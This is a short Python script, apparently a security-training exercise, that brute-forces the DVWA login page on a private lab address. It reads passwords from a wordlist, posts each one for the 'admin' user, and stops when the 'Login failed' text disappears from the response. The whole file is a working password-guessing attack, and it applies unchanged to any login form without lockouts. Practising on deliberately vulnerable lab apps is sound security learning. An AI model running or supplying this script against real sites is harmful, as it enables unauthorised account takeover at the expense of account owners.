#!/usr/bin/env python

"""
Ver: Python3

it quesses password for login in  by using brute force method based on example password from file
"""

import requests


target_url = "http://192.168.1.101/dvwa/login.php"
data_dict = {"username":"admin", "password":"", "Login": "submit"}


with open("passwords.txt", "r") as password_file:
    for line in password_file:
        password = line.strip()
        data_dict["password"] = password
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode():
            print(" Password is OK = " + password)
            exit()

print(" Reached end of file")
